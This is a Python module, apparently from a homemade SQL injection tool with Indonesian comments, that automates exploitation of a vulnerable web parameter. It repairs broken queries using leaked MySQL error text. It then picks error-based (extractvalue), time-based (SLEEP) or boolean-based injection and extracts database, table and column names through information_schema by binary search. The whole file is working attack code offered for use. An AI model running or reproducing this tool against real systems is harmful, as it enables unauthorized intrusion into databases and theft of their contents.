# core/enumerator.py
import re
import time
from lib.requester import send_request, build_url_with_param

class Enumerator:
    def __init__(self, url, vuln_param, technique, dbms=None, debug=False):
        self.url = url
        self.param = vuln_param
        self.technique = technique
        self.dbms = dbms
        self.debug = debug
        self._cache = {}
        self._prefix = None
        self._suffix = None
        self._broken_column = None  # Kolom yang nilainya kosong, contoh: cat_id

    def _log(self, msg):
        if self.debug:
            print(f"[DEBUG] {msg}")

    # ========== 1. DETEKSI STRUKTUR SQL DAN COLUMN YANG BROKEN ==========
    def _detect_broken_column(self):
        """Memeriksa struktur SQL dari pesan error untuk menemukan kolom yang nilainya kosong."""
        # Payload untuk memicu error SQL
        test_payload = "99' AND 1=1-- -"
        url = build_url_with_param(self.url, self.param, test_payload)
        resp = send_request(url)

        if not resp or 'MySQL Query Error' not in resp.text:
            self._log("Tidak bisa mendeteksi struktur SQL dari error.")
            return None

        # Mencari baris [sql] => ... di pesan error
        sql_match = re.search(r'\[sql\]\s*=>\s*(.*?)\n', resp.text)
        if not sql_match:
            self._log("Tidak bisa mengekstrak query SQL dari pesan error.")
            return None

        raw_sql = sql_match.group(1)
        self._log(f"Struktur SQL terdeteksi: {raw_sql}")

        # Cari pola: AND column_name= AND (nilai setelah = langsung diikuti AND lagi)
        # Contoh: ... AND cat_id= AND is_open=1 ...
        match = re.search(r'AND\s+(\w+)=\s+AND', raw_sql, re.IGNORECASE)
        if match:
            self._broken_column = match.group(1)
            self._log(f"Kolom bermasalah terdeteksi: {self._broken_column}")
            return self._broken_column
        else:
            self._log("Tidak dapat mendeteksi kolom yang nilainya kosong.")
            return None

    # ========== 2. MEMBANGUN PREFIX DAN SUFFIX UNTUK MEMPERBAIKI QUERY ==========
    def _build_prefix_suffix(self):
        """Membangun prefix dan suffix untuk membuat query menjadi valid."""
        if self._prefix is not None:
            return self._prefix, self._suffix

        broken_col = self._detect_broken_column()
        if broken_col:
            # Contoh: kita akan membuat prefix dan suffix untuk query yang tadinya
            # ... AND cat_id= AND is_open=1 ...
            # menjadi ... AND (injection) AND cat_id='1' AND is_open=1 ...
            self._prefix = "95' AND "
            # Memberikan nilai dummy 1 pada kolom yang kosong
            self._suffix = f" AND {broken_col}='1' AND '1'='1'-- -"
        else:
            # Fallback jika tidak ada kolom yang broken
            self._prefix = "1' AND "
            self._suffix = "-- -"

        self._log(f"Prefix: {self._prefix}")
        self._log(f"Suffix: {self._suffix}")
        return self._prefix, self._suffix

    def _build_payload(self, injection):
        """Menggabungkan prefix, injection, dan suffix."""
        prefix, suffix = self._build_prefix_suffix()
        # Menambahkan kurung untuk injection agar prioritasnya jelas
        return f"{prefix}({injection}){suffix}"

    # ========== 3. DETEKSI TEKNIK ENUMERASI VIABLE ==========
    def _is_error_based_possible(self):
        """Memeriksa apakah error-based (extractvalue) bisa digunakan."""
        # Uji coba dengan ekstraksi versi MySQL
        injection = "extractvalue(1,concat(0x7e,version()))"
        payload = self._build_payload(injection)
        url = build_url_with_param(self.url, self.param, payload)
        resp = send_request(url)

        if resp and 'XPATH syntax error' in resp.text and '~' in resp.text:
            self._log("Teknik Error-BASED tersedia.")
            return True
        self._log("Teknik Error-BASED TIDAK tersedia.")
        return False

    def _is_time_based_possible(self, delay=5):
        """Memeriksa apakah time-based bisa digunakan."""
        # Payload untuk kondisi TRUE (harus delay)
        injection_true = f"IF(1=1, SLEEP({delay}), 0)"
        payload_true = self._build_payload(injection_true)
        url_true = build_url_with_param(self.url, self.param, payload_true)

        start = time.time()
        send_request(url_true, timeout=delay + 2)
        elapsed_true = time.time() - start

        # Payload untuk kondisi FALSE (harus TIDAK delay)
        injection_false = f"IF(1=2, SLEEP({delay}), 0)"
        payload_false = self._build_payload(injection_false)
        url_false = build_url_with_param(self.url, self.param, payload_false)

        start = time.time()
        send_request(url_false, timeout=delay + 2)
        elapsed_false = time.time() - start

        self._log(f"Waktu TRUE: {elapsed_true:.2f}s, FALSE: {elapsed_false:.2f}s")
        return elapsed_true >= delay and elapsed_false < delay

    def _is_boolean_based_possible(self):
        """Memeriksa apakah boolean-based bisa digunakan."""
        # Payload untuk kondisi TRUE
        payload_true = self._build_payload("1=1")
        url_true = build_url_with_param(self.url, self.param, payload_true)
        resp_true = send_request(url_true)

        # Payload untuk kondisi FALSE
        payload_false = self._build_payload("1=2")
        url_false = build_url_with_param(self.url, self.param, payload_false)
        resp_false = send_request(url_false)

        if resp_true and resp_false:
            diff = abs(len(resp_true.text) - len(resp_false.text))
            self._log(f"Perbedaan panjang halaman: {diff}")
            return diff > 20
        return False

    def _detect_best_enum_technique(self):
        """Menentukan teknik enumerasi terbaik yang tersedia."""
        self._log("Mendeteksi teknik enumerasi terbaik...")

        # 1. Prioritas utama: Error-BASED (paling cepat)
        if self._is_error_based_possible():
            return 'error'

        # 2. Time-BASED
        if self._is_time_based_possible():
            return 'time'

        # 3. Boolean-BASED
        if self._is_boolean_based_possible():
            return 'boolean'

        # 4. Terakhir, fallback ke teknik dari detektor awal
        if self.technique in ['error', 'union', 'time', 'boolean']:
            self._log(f"Fallback ke teknik awal: {self.technique}")
            return self.technique

        self._log("Tidak ada teknik enumerasi yang tersedia.")
        return None

    # ========== 4. FUNGSI EKSTRAKSI DATA (ERROR-BASED) ==========
    def _error_extract(self, query):
        """Mengambil satu nilai (string) dari database dengan teknik error-based."""
        injection = f"extractvalue(1,concat(0x7e,({query})))"
        payload = self._build_payload(injection)
        url = build_url_with_param(self.url, self.param, payload)
        resp = send_request(url)

        if not resp or 'XPATH syntax error' not in resp.text:
            return None

        # Mencari teks di antara karakter ~ (tilde)
        # Contoh: ... ~information_schema~ ...
        match = re.search(r"~([^~]+)~", resp.text)
        if match:
            return match.group(1)
        
        # Alternatif: mengambil semua teks setelah ~ pertama
        parts = resp.text.split('~')
        if len(parts) > 1:
            return parts[1].split('~')[0].strip()
        return None

    # ========== 5. FUNGSI EKSTRAKSI DATA UNTUK BLIND (BOOLEAN/TIME) ==========
    def _bool_request(self, condition):
        """Mengirim kondisi untuk boolean-based, mengembalikan True jika kondisi benar."""
        payload = self._build_payload(condition)
        url = build_url_with_param(self.url, self.param, payload)
        resp = send_request(url)

        if not resp:
            return False

        # Baseline untuk kondisi FALSE (1=2)
        false_payload = self._build_payload("1=2")
        false_url = build_url_with_param(self.url, self.param, false_payload)
        false_resp = send_request(false_url)

        if false_resp:
            return len(resp.text) != len(false_resp.text)
        return False

    def _binary_extract_bool(self, query, max_len=200):
        """Mengambil string dengan binary search (boolean-based)."""
        result = ""
        for pos in range(1, max_len + 1):
            low, high = 32, 126  # Karakter ASCII yang bisa dicetak
            found = False
            while low <= high:
                mid = (low + high) // 2
                condition = f"ascii(substring(({query}), {pos}, 1)) > {mid}"
                if self._bool_request(condition):
                    low = mid + 1
                else:
                    high = mid - 1
            char_code = low
            if char_code < 32 or char_code > 126:
                break
            result += chr(char_code)
            self._log(f"Bool extract: {result}")
        return result

    def _time_request(self, condition, delay=3):
        """Mengirim kondisi untuk time-based, mengembalikan True jika ada delay."""
        injection = f"IF(({condition}), SLEEP({delay}), 0)"
        payload = self._build_payload(injection)
        url = build_url_with_param(self.url, self.param, payload)
        start = time.time()
        send_request(url, timeout=delay + 2)
        elapsed = time.time() - start
        return elapsed >= delay

    def _binary_extract_time(self, query, max_len=200):
        """Mengambil string dengan binary search (time-based)."""
        result = ""
        for pos in range(1, max_len + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                condition = f"ascii(substring(({query}), {pos}, 1)) > {mid}"
                if self._time_request(condition, delay=3):
                    low = mid + 1
                else:
                    high = mid - 1
            char_code = low
            if char_code < 32 or char_code > 126:
                break
            result += chr(char_code)
            self._log(f"Time extract: {result}")
        return result

    def _extract_multiple(self, query, mode, max_rows=20):
        """Mengambil beberapa baris data untuk blind."""
        # 1. Menghitung jumlah total baris
        count_query = f"SELECT COUNT(*) FROM ({query}) AS subq"
        if mode == 'bool':
            count_str = self._binary_extract_bool(count_query, max_len=5)
        else:
            count_str = self._binary_extract_time(count_query, max_len=5)

        try:
            total = int(count_str)
        except:
            total = 0

        if total > max_rows:
            total = max_rows

        # 2. Mengambil setiap baris
        results = []
        for i in range(total):
            row_query = f"{query} LIMIT {i},1"
            if mode == 'bool':
                val = self._binary_extract_bool(row_query)
            else:
                val = self._binary_extract_time(row_query)
            if val:
                results.append(val)
        return results

    # ========== 6. PUBLIC METHODS ==========
    def list_databases(self):
        cache_key = 'dbs'
        if cache_key in self._cache:
            return self._cache[cache_key]

        # Langkah 1: Bangun prefix/suffix yang valid
        self._build_prefix_suffix()

        # Langkah 2: Tentukan teknik terbaik
        best_tech = self._detect_best_enum_technique()
        if not best_tech:
            print("[!] Tidak ada teknik enumerasi yang ditemukan.")
            return []

        print(f"[*] Menggunakan teknik enumerasi: {best_tech.upper()}")
        dbs = []

        if best_tech == 'error':
            print("[*] Mengambil daftar database dengan error-based...")
            for i in range(1, 20):
                query = f"SELECT schema_name FROM information_schema.schemata LIMIT {i-1},1"
                db = self._error_extract(query)
                if db and db not in dbs:
                    dbs.append(db)
                    self._log(f"Menemukan database: {db}")
                else:
                    break

        elif best_tech == 'boolean':
            query = "SELECT schema_name FROM information_schema.schemata"
            dbs = self._extract_multiple(query, 'bool')

        elif best_tech == 'time':
            query = "SELECT schema_name FROM information_schema.schemata"
            dbs = self._extract_multiple(query, 'time')

        # Fallback: mencoba mengambil semua database sekaligus dengan GROUP_CONCAT
        if not dbs and best_tech == 'error':
            print("[*] Mencoba fallback dengan GROUP_CONCAT...")
            query = "SELECT GROUP_CONCAT(schema_name SEPARATOR '|') FROM information_schema.schemata"
            all_dbs = self._error_extract(query)
            if all_dbs:
                dbs = all_dbs.split('|')
                self._log(f"Fallback berhasil: {dbs}")

        self._cache[cache_key] = dbs
        if dbs:
            print(f"[+] Menemukan {len(dbs)} database: {', '.join(dbs[:10])}")
        else:
            print("[!] Tidak dapat mengambil daftar database.")
        return dbs

    def list_tables(self, db_name):
        cache_key = f'tables_{db_name}'
        if cache_key in self._cache:
            return self._cache[cache_key]

        self._build_prefix_suffix()
        best_tech = self._detect_best_enum_technique()
        if not best_tech:
            return []

        print(f"[*] Mengambil daftar tabel di database '{db_name}' dengan teknik {best_tech.upper()}...")
        tables = []

        if best_tech == 'error':
            for i in range(1, 30):
                query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i-1},1"
                t = self._error_extract(query)
                if t and t not in tables:
                    tables.append(t)
                else:
                    break

        elif best_tech == 'boolean':
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}'"
            tables = self._extract_multiple(query, 'bool')

        elif best_tech == 'time':
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}'"
            tables = self._extract_multiple(query, 'time')

        self._cache[cache_key] = tables
        if tables:
            print(f"[+] Menemukan {len(tables)} tabel di '{db_name}': {', '.join(tables[:10])}")
        return tables

    def list_columns(self, db_name, table_name):
        cache_key = f'columns_{db_name}_{table_name}'
        if cache_key in self._cache:
            return self._cache[cache_key]

        self._build_prefix_suffix()
        best_tech = self._detect_best_enum_technique()
        if not best_tech:
            return []

        print(f"[*] Mengambil daftar kolom di '{db_name}.{table_name}' dengan teknik {best_tech.upper()}...")
        columns = []

        if best_tech == 'error':
            for i in range(1, 30):
                query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {i-1},1"
                c = self._error_extract(query)
                if c and c not in columns:
                    columns.append(c)
                else:
                    break

        elif best_tech == 'boolean':
            query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'"
            columns = self._extract_multiple(query, 'bool')

        elif best_tech == 'time':
            query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'"
            columns = self._extract_multiple(query, 'time')

        self._cache[cache_key] = columns
        if columns:
            print(f"[+] Menemukan {len(columns)} kolom di '{table_name}': {', '.join(columns[:10])}")
        return columns